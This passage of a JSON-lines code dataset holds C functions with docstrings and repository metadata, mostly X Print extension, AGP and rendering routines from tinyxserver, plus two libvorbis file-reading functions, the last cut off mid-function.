{"docstring": "/*******************************************************************************\n *\n * Attribute requests: GetAttributes, SetAttributes, GetOneAttribute\n *\n ******************************************************************************/\n", "func_signal": "static int \nProcXpGetAttributes(ClientPtr client)", "code": "{\n    REQUEST(xPrintGetAttributesReq);\n    XpContextPtr pContext;\n    char *attrs;\n    xPrintGetAttributesReply *pRep;\n    int totalSize, n;\n    unsigned long l;\n\n    REQUEST_SIZE_MATCH(xPrintGetAttributesReq);\n\n    if(stuff->type < XPJobAttr || stuff->type > XPServerAttr)\n    {\n\tclient->errorValue = stuff->type;\n\treturn BadValue;\n    }\n\n    if(stuff->type != XPServerAttr)\n    {\n        if((pContext = (XpContextPtr)SecurityLookupIDByType(\n\t\t\t\t\t\tclient,\n\t\t\t\t\t\tstuff->printContext,\n\t\t\t\t\t\tRTcontext,\n\t\t\t\t\t\tSecurityReadAccess))\n\t   == (XpContextPtr)NULL)\n        {\n\t    client->errorValue = stuff->printContext;\n            return XpErrorBase+XPBadContext;\n        }\n\n        if(pContext->funcs.GetAttributes == 0)\n\t    return BadImplementation;\n        if((attrs = (*pContext->funcs.GetAttributes)(pContext, stuff->type)) == \n           (char *)NULL) \n\t    return BadAlloc;\n    }\n    else\n    {\n\tif((attrs = XpGetAttributes((XpContextPtr)NULL, XPServerAttr)) ==\n\t   (char *)NULL)\n\t    return BadAlloc;\n    }\n\n    totalSize = sz_xPrintGetAttributesReply + QUADPAD(strlen(attrs));\n    if((pRep = (xPrintGetAttributesReply *)malloc(totalSize)) ==\n       (xPrintGetAttributesReply *)NULL)\n\treturn BadAlloc;\n\n    pRep->type = X_Reply;\n    pRep->length = (totalSize - sz_xPrintGetAttributesReply) >> 2;\n    pRep->sequenceNumber = client->sequence;\n    pRep->stringLen = strlen(attrs);\n\n    if (client->swapped) {\n        swaps(&pRep->sequenceNumber, n);\n        swapl(&pRep->length, l);\n        swapl(&pRep->stringLen, l);\n    }\n\n    strncpy((char*)(pRep + 1), attrs, strlen(attrs));\n    xfree(attrs);\n\n    WriteToClient(client, totalSize, (char *)pRep);\n\n    xfree(pRep);\n\n    return client->noClientException;\n}", "path": "Xext\\xprint.c", "repo_name": "idunham/tinyxserver", "stars": 69, "license": "None", "language": "c", "size": 1728}
{"docstring": "/*******************************************************************************\n *\n * GetPrinterList : Return a list of all printers associated with this\n *                  server.  Calls XpDiGetPrinterList, which is defined in\n *\t\t    the device-independent code in Xserver/Xprint.\n *\n ******************************************************************************/\n", "func_signal": "static int\nProcXpGetPrinterList(ClientPtr client)", "code": "{\n    REQUEST(xPrintGetPrinterListReq);\n    int totalSize;\n    int numEntries;\n    XpDiListEntry **pList;\n    xPrintGetPrinterListReply *rep;\n    int n, i, totalBytes;\n    long l;\n    char *curByte;\n\n    REQUEST_AT_LEAST_SIZE(xPrintGetPrinterListReq);\n\n    totalSize = ((sz_xPrintGetPrinterListReq) >> 2) +\n                ((stuff->printerNameLen + 3) >> 2) +\n                ((stuff->localeLen + 3) >> 2);\n    if(totalSize != client->req_len)\n\t return BadLength;\n\n    pList = XpDiGetPrinterList(stuff->printerNameLen, (char *)(stuff + 1), \n\t\t\t       stuff->localeLen, (char *)((stuff + 1) + \n\t\t\t       QUADPAD(stuff->printerNameLen)));\n\n    for(numEntries = 0, totalBytes = sz_xPrintGetPrinterListReply;\n\tpList[numEntries] != (XpDiListEntry *)NULL;\n\tnumEntries++)\n    {\n\ttotalBytes += 2 * sizeof(CARD32); \n\ttotalBytes += QUADPAD(strlen(pList[numEntries]->name));\n\ttotalBytes += QUADPAD(strlen(pList[numEntries]->description));\n    }\n\n    if((rep = (xPrintGetPrinterListReply *)xalloc(totalBytes)) == \n       (xPrintGetPrinterListReply *)NULL)\n\treturn BadAlloc;\n\n    rep->type = X_Reply;\n    rep->length = (totalBytes - sz_xPrintGetPrinterListReply) >> 2;\n    rep->sequenceNumber = client->sequence;\n    rep->listCount = numEntries;\n    if (client->swapped) {\n        swaps(&rep->sequenceNumber, n);\n        swapl(&rep->length, l);\n        swapl(&rep->listCount, l);\n    }\n\n    for(i = 0, curByte = (char *)(rep + 1); i < numEntries; i++)\n    {\n\tCARD32 *pCrd;\n\tint len;\n\n\tpCrd = (CARD32 *)curByte;\n\tlen = strlen(pList[i]->name);\n\t*pCrd = len;\n        if (client->swapped)\n            swapl((long *)curByte, l);\n\tcurByte += sizeof(CARD32);\n\tstrncpy(curByte, pList[i]->name, len);\n\tcurByte += QUADPAD(len);\n\n\tpCrd = (CARD32 *)curByte;\n\tlen = strlen(pList[i]->description);\n\t*pCrd = len;\n        if (client->swapped)\n            swapl((long *)curByte, l);\n\tcurByte += sizeof(CARD32);\n\tstrncpy(curByte, pList[i]->description, len);\n\tcurByte += QUADPAD(len);\n    }\n\n    XpDiFreePrinterList(pList);\n\n    WriteToClient(client, totalBytes, (char *)rep);\n    xfree(rep);\n    return client->noClientException;\n}", "path": "Xext\\xprint.c", "repo_name": "idunham/tinyxserver", "stars": 69, "license": "None", "language": "c", "size": 1728}
{"docstring": "/* NOT USED */\n", "func_signal": "static void\nFreeScreenEntry(XpScreenPtr pScreenEntry)", "code": "{\n    XpDriverPtr pDriver;\n\n    pDriver = pScreenEntry->drivers; \n    while(pDriver != (XpDriverPtr)NULL)\n    {\n\tXpDriverPtr tmp;\n\n\ttmp = pDriver->next;\n\txfree(pDriver);\n\tpDriver = tmp;\n    }\n    xfree(pScreenEntry);\n}", "path": "Xext\\xprint.c", "repo_name": "idunham/tinyxserver", "stars": 69, "license": "None", "language": "c", "size": 1728}
{"docstring": "/******************************************************************************\n *\n * Start/End Functions: StartJob, EndJob, StartDoc, EndDoc, StartPage, EndPage\n *\n ******************************************************************************/\n", "func_signal": "static int\nProcXpStartJob(ClientPtr client)", "code": "{\n    REQUEST(xPrintStartJobReq);\n    XpContextPtr pContext;\n    int result = Success;\n    XpScreenPtr pPrintScreen;\n\n    REQUEST_SIZE_MATCH(xPrintStartJobReq);\n\n    /* Check to see that a context has been established by this client. */\n    if((pContext = (XpContextPtr)client->devPrivates[XpClientPrivateIndex].ptr)\n       == (XpContextPtr)NULL)\n        return XpErrorBase+XPBadContext;\n\n    if(pContext->state != 0)\n\treturn XpErrorBase+XPBadSequence;\n\n    if(stuff->saveData != XPSpool && stuff->saveData != XPGetData)\n    {\n\tclient->errorValue = stuff->saveData;\n\treturn BadValue;\n    }\n\n    pPrintScreen = XpScreens[pContext->screenNum];\n    if(pContext->funcs.StartJob != 0)\n        result = pContext->funcs.StartJob(pContext, \n\t\t\t (stuff->saveData == XPGetData)? TRUE:FALSE,\n\t\t\t client);\n    else\n        return BadImplementation;\n\n    pContext->state = JOB_STARTED;\n    if(stuff->saveData == XPGetData)\n\tpContext->state |= JOB_GET_DATA;\n\n    SendXpNotify(pContext, XPStartJobNotify, FALSE);\n\n    if (client->noClientException != Success)\n        return client->noClientException;\n    else\n        return result;\n}", "path": "Xext\\xprint.c", "repo_name": "idunham/tinyxserver", "stars": 69, "license": "None", "language": "c", "size": 1728}
{"docstring": "/*\n * CreateContext creates and initializes the memory for the context itself.\n * The driver's CreateContext function\n * is then called.\n */\n", "func_signal": "static int\nProcXpCreateContext(ClientPtr client)", "code": "{\n    REQUEST(xPrintCreateContextReq);\n    XpScreenPtr pPrintScreen;\n    WindowPtr pRoot;\n    char *driverName;\n    XpContextPtr pContext;\n    int result = Success;\n    XpDriverPtr pDriver;\n\n    REQUEST_AT_LEAST_SIZE(xPrintCreateContextReq);\n\n    LEGAL_NEW_RESOURCE(stuff->contextID, client);\n\n    /*\n     * Check to see if the printer name is valid.\n     */\n    if((pRoot = XpDiValidatePrinter((char *)(stuff + 1), stuff->printerNameLen)) == \n       (WindowPtr)NULL)\n\treturn BadMatch;\n\n    pPrintScreen = XpScreens[pRoot->drawable.pScreen->myNum];\n\n    /*\n     * Allocate and add the context resource.\n     */\n    if((pContext = (XpContextPtr) xalloc(totalContextSize)) == \n       (XpContextPtr) NULL)\n\treturn BadAlloc;\n\n    InitContextPrivates(pContext);\n\n    if(AddResource(stuff->contextID, RTcontext, (pointer) pContext)\n       != TRUE)\n    {\n       xfree(pContext);\n       return BadAlloc;\n    }\n\n    pContext->contextID = stuff->contextID;\n    pContext->clientHead = (XpClientPtr)NULL;\n    pContext->screenNum = pRoot->drawable.pScreen->myNum;\n    pContext->state = 0;\n    pContext->clientSlept = (ClientPtr)NULL;\n    pContext->imageRes = 0;\n\n    pContext->funcs.DestroyContext = 0;\n    pContext->funcs.StartJob = 0;\n    pContext->funcs.EndJob = 0;\n    pContext->funcs.StartDoc = 0;\n    pContext->funcs.EndDoc = 0;\n    pContext->funcs.StartPage = 0;\n    pContext->funcs.EndPage = 0;\n    pContext->funcs.PutDocumentData = 0;\n    pContext->funcs.GetDocumentData = 0;\n    pContext->funcs.GetAttributes = 0;\n    pContext->funcs.GetOneAttribute = 0;\n    pContext->funcs.SetAttributes = 0;\n    pContext->funcs.AugmentAttributes = 0;\n    pContext->funcs.GetMediumDimensions = 0;\n    pContext->funcs.GetReproducibleArea = 0;\n    pContext->funcs.SetImageResolution = 0;\n\n    if((pContext->printerName = (char *)xalloc(stuff->printerNameLen + 1)) == \n       (char *)NULL)\n    {\n\t/* Freeing the context also causes the XpClients to be freed. */\n\tFreeResource(stuff->contextID, RT_NONE);\n\treturn BadAlloc;\n    }\n    strncpy(pContext->printerName, (char *)(stuff + 1), stuff->printerNameLen);\n    pContext->printerName[stuff->printerNameLen] = (char)'\\0';\n\n    driverName = XpDiGetDriverName(pRoot->drawable.pScreen->myNum, \n\t\t\t\t   pContext->printerName);\n    \n    for(pDriver = pPrintScreen->drivers; \n\tpDriver != (XpDriverPtr)NULL;\n\tpDriver = pDriver->next)\n    {\n\tif(!strcmp(driverName, pDriver->name))\n\t{\n\t    if(pDriver->CreateContext != 0)\n\t        pDriver->CreateContext(pContext);\n\t    else\n\t        return BadImplementation;\n\t    break;\n\t}\n    }\n\n    if (client->noClientException != Success)\n        return client->noClientException;\n    else\n\treturn result;\n}", "path": "Xext\\xprint.c", "repo_name": "idunham/tinyxserver", "stars": 69, "license": "None", "language": "c", "size": 1728}
{"docstring": "/*******************************************************************************\n *\n * RehashPrinterList : Cause the server's list of printers to be rebuilt.\n *                     This allows new printers to be added, or old ones\n *\t\t       deleted without needing to restart the server.\n *\n ******************************************************************************/\n", "func_signal": "static int\nProcXpRehashPrinterList(ClientPtr client)", "code": "{\n    /* REQUEST(xPrintRehashPrinterListReq); */\n\n    REQUEST_SIZE_MATCH(xPrintRehashPrinterListReq);\n\n    return XpRehashPrinterList();\n}", "path": "Xext\\xprint.c", "repo_name": "idunham/tinyxserver", "stars": 69, "license": "None", "language": "c", "size": 1728}
{"docstring": "/*******************************************************************************\n *\n * Print Event requests: SelectInput InputSelected, SendXpNotify\n *\n ******************************************************************************/\n", "func_signal": "static int\nProcXpSelectInput(ClientPtr client)", "code": "{\n    REQUEST(xPrintSelectInputReq);\n    int result = Success;\n    XpContextPtr pContext;\n    XpClientPtr pPrintClient;\n\n    REQUEST_SIZE_MATCH(xPrintSelectInputReq);\n\n    /*\n     * Check to see that the supplied XID is really a valid print context\n     * in this server.\n     */\n    if((pContext=(XpContextPtr)SecurityLookupIDByType(client,\n\t\t\t\t\t\t      stuff->printContext,\n\t\t\t\t\t\t      RTcontext,\n\t\t\t\t\t\t      SecurityWriteAccess))\n       == (XpContextPtr)NULL)\n    {\n\tclient->errorValue = stuff->printContext;\n        return XpErrorBase+XPBadContext;\n    }\n\n    if(stuff->eventMask & ~allEvents)\n    {\n\tclient->errorValue = stuff->eventMask;\n        return BadValue; /* bogus event mask bits */\n    }\n\n    if((pPrintClient = AcquireClient(pContext, client)) == (XpClientPtr)NULL)\n\treturn BadAlloc;\n\n    pPrintClient->eventMask = stuff->eventMask;\n\n    return result;\n}", "path": "Xext\\xprint.c", "repo_name": "idunham/tinyxserver", "stars": 69, "license": "None", "language": "c", "size": 1728}
{"docstring": "/*\n * XXX If multiple screens can acquire the GART, should we have a reference\n * count instead of using acquiredScreen?\n */\n", "func_signal": "Bool\nKdAcquireGART(int screenNum)", "code": "{\n    if (screenNum != -1 && !GARTInit())\n        return FALSE;\n    \n    if (screenNum == -1 || acquiredScreen != screenNum) {\n        if (ioctl(gartFd, AGPIOC_ACQUIRE, 0) != 0) {\n#ifdef ERRORS\n            fprintf(stderr, \n                    \"AGPIOC_ACQUIRE failed (%s)\\n\", \n                    strerror(errno)); \n#endif\n            return FALSE;\n        }\n        acquiredScreen = screenNum;\n    }\n    \n    return TRUE;\n}", "path": "hw\\kdrive\\linux\\agp.c", "repo_name": "idunham/tinyxserver", "stars": 69, "license": "None", "language": "c", "size": 1728}
{"docstring": "/* Bind GART memory with \"key\" at \"offset\" */\n", "func_signal": "Bool\nKdBindGARTMemory(int screenNum, int key, unsigned long offset)", "code": "{\n\tstruct _agp_bind bind;\n\tint pageOffset;\n\n\tif (!GARTInit() || acquiredScreen != screenNum)\n\t\treturn FALSE;\n\n\tif (acquiredScreen != screenNum) {\n#ifdef ERRORS\n            fprintf(stderr, \n                    \"AGP not acquired by this screen\\n\"); \n#endif\n            return FALSE;\n\t}\n\n\tif (offset % AGP_PAGE_SIZE != 0) {\n#ifdef ERRORS\n            fprintf(stderr, \"KdBindGARTMemory: \" \n                    \"offset (0x%lx) is not page-aligned (%d)\\n\", \n                    offset, AGP_PAGE_SIZE); \n#endif\n            return FALSE;\n\t}\n\tpageOffset = offset / AGP_PAGE_SIZE;\n\n\tbind.pg_start = pageOffset;\n\tbind.key = key;\n\n\tif (ioctl(gartFd, AGPIOC_BIND, &bind) != 0) {\n#ifdef ERRORS\n\t\tfprintf(stderr, \"KdBindGARTMemory: \"\n                        \"binding of gart memory with key %d\\n\"\n                        \"\\tat offset 0x%lx failed (%s)\\n\",\n                        key, offset, strerror(errno));\n#endif\n\t\treturn FALSE;\n\t}\n\n\treturn TRUE;\n}", "path": "hw\\kdrive\\linux\\agp.c", "repo_name": "idunham/tinyxserver", "stars": 69, "license": "None", "language": "c", "size": 1728}
{"docstring": "/*\n * XpRegisterInitFunc tells the print extension which screens\n * are printers as opposed to displays, and what drivers are\n * supported on each screen.  This eliminates the need of\n * allocating print-related private structures on windows on _all_ screens.\n * It also hands the extension a pointer to the routine to be called\n * whenever a context gets created for a particular driver on this screen.\n */\n", "func_signal": "void\nXpRegisterInitFunc(ScreenPtr pScreen, char *driverName, int (*initContext)(struct _XpContext *))", "code": "{\n    XpDriverPtr pDriver;\n\n    if(XpScreens[pScreen->myNum] == 0)\n    {\n        if((XpScreens[pScreen->myNum] =\n           (XpScreenPtr) Xalloc(sizeof(XpScreenRec))) == 0)\n            return;\n\tXpScreens[pScreen->myNum]->CloseScreen = 0;\n\tXpScreens[pScreen->myNum]->drivers = 0;\n    }\n\n    if((pDriver = (XpDriverPtr)Xalloc(sizeof(XpDriverRec))) == 0)\n\treturn;\n    pDriver->next = XpScreens[pScreen->myNum]->drivers;\n    pDriver->name = driverName;\n    pDriver->CreateContext = initContext;\n    XpScreens[pScreen->myNum]->drivers = pDriver;\n}", "path": "Xext\\xprint.c", "repo_name": "idunham/tinyxserver", "stars": 69, "license": "None", "language": "c", "size": 1728}
{"docstring": "/*\n * CreateXpClient takes a ClientPtr and returns a pointer to a\n * XpClientRec which it allocates.  It also initializes the Rec,\n * including adding a resource on behalf of the client to enable the\n * freeing of the Rec when the client's connection is closed.\n */\n", "func_signal": "static XpClientPtr\nCreateXpClient(ClientPtr client)", "code": "{\n    XpClientPtr pNewPrintClient;\n    XID clientResource;\n\n    if((pNewPrintClient = (XpClientPtr)xalloc(sizeof(XpClientRec))) ==\n      (XpClientPtr)NULL)\n        return (XpClientPtr)NULL;\n\n    clientResource = FakeClientID(client->index);\n    if(!AddResource(clientResource, RTclient, (pointer)pNewPrintClient))\n    {\n        xfree (pNewPrintClient);\n        return (XpClientPtr)NULL;\n    }\n\n    pNewPrintClient->pNext = (XpClientPtr)NULL;\n    pNewPrintClient->client = client;\n    pNewPrintClient->context = (XpContextPtr)NULL;\n    pNewPrintClient->eventMask = 0;\n    pNewPrintClient->contextClientID = clientResource;\n\n    return pNewPrintClient;\n}", "path": "Xext\\xprint.c", "repo_name": "idunham/tinyxserver", "stars": 69, "license": "None", "language": "c", "size": 1728}
{"docstring": "/*\n * XpFreeClient is the routine called by dix:FreeResource when a RTclient\n * is freed.  It simply calls the FreeXpClient routine to do the work.\n */\n", "func_signal": "static int\nXpFreeClient(pointer data, XID id)", "code": "{\n    FreeXpClient((XpClientPtr)data, TRUE);\n    return Success;\n}", "path": "Xext\\xprint.c", "repo_name": "idunham/tinyxserver", "stars": 69, "license": "None", "language": "c", "size": 1728}
{"docstring": "/*\n * SetContext creates the calling client's contextClient resource,\n * and stashes the contextID in the client's devPrivate.\n */\n", "func_signal": "static int\nProcXpSetContext(ClientPtr client)", "code": "{\n    REQUEST(xPrintSetContextReq);\n\n    XpContextPtr pContext;\n    XpClientPtr pPrintClient;\n    int result = Success;\n\n    REQUEST_AT_LEAST_SIZE(xPrintSetContextReq);\n\n    if((pContext = client->devPrivates[XpClientPrivateIndex].ptr) != \n       (pointer)NULL)\n    {\n\t/*\n\t * Erase this client's knowledge of its old context, if any.\n\t */\n        if((pPrintClient = FindClient(pContext, client)) != (XpClientPtr)NULL)\n        {\n\t    XpUnsetFontResFunc(client);\n\t    \n\t    if(pPrintClient->eventMask == 0)\n\t\tFreeXpClient(pPrintClient, TRUE);\n        }\n\n        client->devPrivates[XpClientPrivateIndex].ptr = (pointer)NULL;\n    }\n    if(stuff->printContext == None)\n        return Success;\n\n    /*\n     * Check to see that the supplied XID is really a valid print context\n     * in this server.\n     */\n    if((pContext =(XpContextPtr)SecurityLookupIDByType(client,\n\t\t\t\t\t\t       stuff->printContext,\n\t\t\t\t\t\t       RTcontext,\n\t\t\t\t\t\t       SecurityWriteAccess))\n       == (XpContextPtr)NULL)\n    {\n\tclient->errorValue = stuff->printContext;\n        return XpErrorBase+XPBadContext;\n    }\n\n    if((pPrintClient = AcquireClient(pContext, client)) == (XpClientPtr)NULL)\n        return BadAlloc;\n\n    client->devPrivates[XpClientPrivateIndex].ptr = pContext;\n\n    XpSetFontResFunc(client);\n\n    if (client->noClientException != Success)\n        return client->noClientException;\n    else\n\treturn result;\n}", "path": "Xext\\xprint.c", "repo_name": "idunham/tinyxserver", "stars": 69, "license": "None", "language": "c", "size": 1728}
{"docstring": "/*\n * ContextPrivate machinery.\n * Context privates are intended for use by the drivers, allowing the\n * drivers to maintain context-specific data.  The driver should free\n * the associated data at DestroyContext time.\n */\n", "func_signal": "static void\nInitContextPrivates(XpContextPtr context)", "code": "{\n    register char *ptr;\n    DevUnion *ppriv;\n    register unsigned *sizes;\n    register unsigned size;\n    register int i;\n\n    if (totalContextSize == sizeof(XpContextRec))\n        ppriv = (DevUnion *)NULL;\n    else \n        ppriv = (DevUnion *)(context + 1);\n\n    context->devPrivates = ppriv;\n    sizes = contextPrivateSizes;\n    ptr = (char *)(ppriv + contextPrivateLen);\n    for (i = contextPrivateLen; --i >= 0; ppriv++, sizes++)\n    {\n        if ( (size = *sizes) )\n        {\n            ppriv->ptr = (pointer)ptr;\n            ptr += size;\n        }\n        else\n            ppriv->ptr = (pointer)NULL;\n    }\n}", "path": "Xext\\xprint.c", "repo_name": "idunham/tinyxserver", "stars": 69, "license": "None", "language": "c", "size": 1728}
{"docstring": "/*\n * XpFreePage is the routine called by dix:FreeResource to free the page\n * resource built with the same ID as a page window.  It checks to see\n * if we're in the middle of a page, and if so calls the driver's EndPage\n * function with 'cancel' set TRUE.  It frees the memory associated with\n * the page resource.\n */\n", "func_signal": "static int\nXpFreePage(pointer data, XID id)", "code": "{\n    XpPagePtr page = (XpPagePtr)data;\n    int result = Success;\n    WindowPtr pWin = (WindowPtr )LookupIDByType(id, RT_WINDOW);\n\n    /* Check to see if the window's being deleted in the middle of a page */\n    if(page->context != (XpContextPtr)NULL && \n       page->context->state & PAGE_STARTED)\n    {\n\tif(page->context->funcs.EndPage != 0)\n\t    result = page->context->funcs.EndPage(page->context, pWin);\n        SendXpNotify(page->context, XPEndPageNotify, (int)TRUE);\n\tpage->context->pageWin = 0; /* None, NULL??? XXX */\n    }\n\n    xfree(page);\n    return result;\n}", "path": "Xext\\xprint.c", "repo_name": "idunham/tinyxserver", "stars": 69, "license": "None", "language": "c", "size": 1728}
{"docstring": "/*\n * general Poly/Image text function.  Extract glyph information,\n * compute bounding box and remove cursor if it is overlapped.\n */\n", "func_signal": "static Bool\nmiSpriteTextOverlap (\n    DrawablePtr   pDraw,\n    FontPtr\t  font,\n    int\t\t  x,\n    int\t\t  y,\n    unsigned int  n,\n    CharInfoPtr   *charinfo,\n    Bool\t  imageblt,\n    unsigned int  w,\n    BoxPtr\t  cursorBox)", "code": "{\n    ExtentInfoRec extents;\n\n    x += pDraw->x;\n    y += pDraw->y;\n\n    if (FONTMINBOUNDS(font,characterWidth) >= 0)\n    {\n\t/* compute an approximate (but covering) bounding box */\n\tif (!imageblt || (charinfo[0]->metrics.leftSideBearing < 0))\n\t    extents.overallLeft = charinfo[0]->metrics.leftSideBearing;\n\telse\n\t    extents.overallLeft = 0;\n\tif (w)\n\t    extents.overallRight = w - charinfo[n-1]->metrics.characterWidth;\n\telse\n\t    extents.overallRight = FONTMAXBOUNDS(font,characterWidth)\n\t\t\t\t    * (n - 1);\n\tif (imageblt && (charinfo[n-1]->metrics.characterWidth >\n\t\t\t charinfo[n-1]->metrics.rightSideBearing))\n\t    extents.overallRight += charinfo[n-1]->metrics.characterWidth;\n\telse\n\t    extents.overallRight += charinfo[n-1]->metrics.rightSideBearing;\n\tif (imageblt && FONTASCENT(font) > FONTMAXBOUNDS(font,ascent))\n\t    extents.overallAscent = FONTASCENT(font);\n\telse\n\t    extents.overallAscent = FONTMAXBOUNDS(font, ascent);\n\tif (imageblt && FONTDESCENT(font) > FONTMAXBOUNDS(font,descent))\n\t    extents.overallDescent = FONTDESCENT(font);\n\telse\n\t    extents.overallDescent = FONTMAXBOUNDS(font,descent);\n\tif (!BOX_OVERLAP(cursorBox,\n\t\t\t x + extents.overallLeft,\n\t\t\t y - extents.overallAscent,\n\t\t\t x + extents.overallRight,\n\t\t\t y + extents.overallDescent))\n\t    return FALSE;\n\telse if (imageblt && w)\n\t    return TRUE;\n\t/* if it does overlap, fall through and compute exactly, because\n\t * taking down the cursor is expensive enough to make this worth it\n\t */\n    }\n    QueryGlyphExtents(font, charinfo, n, &extents);\n    if (imageblt)\n    {\n\tif (extents.overallWidth > extents.overallRight)\n\t    extents.overallRight = extents.overallWidth;\n\tif (extents.overallWidth < extents.overallLeft)\n\t    extents.overallLeft = extents.overallWidth;\n\tif (extents.overallLeft > 0)\n\t    extents.overallLeft = 0;\n\tif (extents.fontAscent > extents.overallAscent)\n\t    extents.overallAscent = extents.fontAscent;\n\tif (extents.fontDescent > extents.overallDescent)\n\t    extents.overallDescent = extents.fontDescent;\n    }\n    return (BOX_OVERLAP(cursorBox,\n\t\t\tx + extents.overallLeft,\n\t\t\ty - extents.overallAscent,\n\t\t\tx + extents.overallRight,\n\t\t\ty + extents.overallDescent));\n}", "path": "mi\\misprite.c", "repo_name": "idunham/tinyxserver", "stars": 69, "license": "None", "language": "c", "size": 1728}
{"docstring": "/*\n * XpExtensionInit\n *\n * Called from InitExtensions in main() usually through miinitextension\n *\n */\n", "func_signal": "void\nXpExtensionInit(void)", "code": "{\n    ExtensionEntry *extEntry;\n    int i;\n\n    RTclient = CreateNewResourceType(XpFreeClient);\n    RTcontext = CreateNewResourceType(XpFreeContext);\n    RTpage = CreateNewResourceType(XpFreePage);\n    if (RTclient && RTcontext && RTpage &&\n        (extEntry = AddExtension(XP_PRINTNAME, XP_EVENTS, XP_ERRORS,\n                               ProcXpDispatch, ProcXpSwappedDispatch,\n                               XpResetProc, StandardMinorOpcode)))\n    {\n        XpReqCode = (unsigned char)extEntry->base;\n        XpEventBase = extEntry->eventBase;\n        XpErrorBase = extEntry->errorBase;\n        EventSwapVector[XpEventBase] = (EventSwapPtr) SwapXpNotifyEvent;\n        EventSwapVector[XpEventBase+1] = (EventSwapPtr) SwapXpAttributeEvent;\n    }\n\n    if(XpGeneration != serverGeneration)\n    {\n\tXpClientPrivateIndex = AllocateClientPrivateIndex();\n\t/*\n\t * We allocate 0 length & simply stuff a pointer to the\n\t * ContextRec in the DevUnion.\n\t */\n\tif(AllocateClientPrivate(XpClientPrivateIndex, 0) != TRUE)\n\t{\n\t\t/* we can't alloc a client private, should we bail??? XXX */\n\t}\n\tXpGeneration = serverGeneration;\n    }\n\n    for(i = 0; i < MAXSCREENS; i++)\n    {\n\t/*\n\t * If a screen has registered with our extension, then we\n\t * wrap the screen's CloseScreen function to allow us to\n\t * reset our ContextPrivate stuff.  Note that this\n\t * requires a printing DDX to call XpRegisterInitFunc\n\t * _before_ this extension is initialized - i.e. at screen init\n\t * time, _not_ at root window creation time.\n\t */\n\tif(XpScreens[i] != (XpScreenPtr)NULL)\n\t{\n\t    XpScreens[i]->CloseScreen = screenInfo.screens[i]->CloseScreen;\n\t    screenInfo.screens[i]->CloseScreen = XpCloseScreen;\n\t}\n    }\n    DeclareExtensionSecurity(XP_PRINTNAME, TRUE);\n}", "path": "Xext\\xprint.c", "repo_name": "idunham/tinyxserver", "stars": 69, "license": "None", "language": "c", "size": 1728}
{"docstring": "/* Find the index of the point with the smallest y.also return the\n * smallest and largest y */\n", "func_signal": "static\nint\nGetFPolyYBounds(\n    register SppPointPtr\tpts,\n    int \t\t\tn,\n    double\t\t\tyFtrans,\n    int \t\t\t*by,\n    int\t\t\t\t*ty)", "code": "{\n    register SppPointPtr\tptMin;\n    double \t\t\tymin, ymax;\n    SppPointPtr\t\t\tptsStart = pts;\n\n    ptMin = pts;\n    ymin = ymax = (pts++)->y;\n\n    while (--n > 0) {\n        if (pts->y < ymin)\n\t{\n            ptMin = pts;\n            ymin = pts->y;\n        }\n\tif(pts->y > ymax)\n            ymax = pts->y;\n\n        pts++;\n    }\n\n    *by = ICEIL(ymin + yFtrans);\n    *ty = ICEIL(ymax + yFtrans - 1);\n    return(ptMin-ptsStart);\n}", "path": "mi\\mifpolycon.c", "repo_name": "idunham/tinyxserver", "stars": 69, "license": "None", "language": "c", "size": 1728}
{"docstring": "/* save a tiny smidge of verbosity to make the code more readable */\n", "func_signal": "static int _seek_helper(OggVorbis_File *vf,ogg_int64_t offset)", "code": "{\n  if(vf->datasource){ \n    if(!(vf->callbacks.seek_func)||\n       (vf->callbacks.seek_func)(vf->datasource, offset, SEEK_SET) == -1)\n      return OV_EREAD;\n    vf->offset=offset;\n    ogg_sync_reset(&vf->oy);\n  }else{\n    /* shouldn't happen unless someone writes a broken callback */\n    return OV_EFAULT;\n  }\n  return 0;\n}", "path": "Vendor\\libvorbis\\lib\\vorbisfile.c", "repo_name": "nevyn/spot", "stars": 89, "license": "None", "language": "c", "size": 11480}
{"docstring": "/* uses the local ogg_stream storage in vf; this is important for\n   non-streaming input sources */\n", "func_signal": "static int _fetch_headers(OggVorbis_File *vf,vorbis_info *vi,vorbis_comment *vc,\n\t\t\t  long *serialno,ogg_page *og_ptr)", "code": "{\n  ogg_page og;\n  ogg_packet op;\n  int i,ret;\n  int allbos=0;\n\n  if(!og_ptr){\n    ogg_int64_t llret=_get_next_page(vf,&og,CHUNKSIZE);\n    if(llret==OV_EREAD)return(OV_EREAD);\n    if(llret<0)return(OV_ENOTVORBIS);\n    og_ptr=&og;\n  }\n\n  vorbis_info_init(vi);\n  vorbis_comment_init(vc);\n\n  /* extract the first set of vorbis headers we see in the headerset */\n\n  while(1){\n  \n    /* if we're past the ID headers, we won't be finding a Vorbis\n       stream in this link */\n    if(!ogg_page_bos(og_ptr)){\n      ret = OV_ENOTVORBIS;\n      goto bail_header;\n    }\n\n    /* prospective stream setup; we need a stream to get packets */\n    ogg_stream_reset_serialno(&vf->os,ogg_page_serialno(og_ptr));\n    ogg_stream_pagein(&vf->os,og_ptr);\n\n    if(ogg_stream_packetout(&vf->os,&op) > 0 &&\n       vorbis_synthesis_idheader(&op)){\n\n      /* continue Vorbis header load; past this point, any error will\n\t render this link useless (we won't continue looking for more\n\t Vorbis streams */\n      if(serialno)*serialno=vf->os.serialno;\n      vf->ready_state=STREAMSET;\n      if((ret=vorbis_synthesis_headerin(vi,vc,&op)))\n\tgoto bail_header;\n\n      i=0;\n      while(i<2){ /* get a page loop */\n\t\n\twhile(i<2){ /* get a packet loop */\n\n\t  int result=ogg_stream_packetout(&vf->os,&op);\n\t  if(result==0)break;\n\t  if(result==-1){\n\t    ret=OV_EBADHEADER;\n\t    goto bail_header;\n\t  }\n\t\n\t  if((ret=vorbis_synthesis_headerin(vi,vc,&op)))\n\t    goto bail_header;\n\n\t  i++;\n\t}\n\n\twhile(i<2){\n\t  if(_get_next_page(vf,og_ptr,CHUNKSIZE)<0){\n\t    ret=OV_EBADHEADER;\n\t    goto bail_header;\n\t  }\n\n\t  /* if this page belongs to the correct stream, go parse it */\n\t  if(vf->os.serialno == ogg_page_serialno(og_ptr)){\n\t    ogg_stream_pagein(&vf->os,og_ptr);\n\t    break;\n\t  }\n\n\t  /* if we never see the final vorbis headers before the link\n\t     ends, abort */\n\t  if(ogg_page_bos(og_ptr)){\n\t    if(allbos){\n\t      ret = OV_EBADHEADER;\n\t      goto bail_header;\n\t    }else\n\t      allbos=1;\n\t  }\n\n\t  /* otherwise, keep looking */\n\t}\n      }\n\n      return 0; \n    }\n\n    /* this wasn't vorbis, get next page, try again */\n    {\n      ogg_int64_t llret=_get_next_page(vf,og_ptr,CHUNKSIZE);\n      if(llret==OV_EREAD)return(OV_EREAD);\n      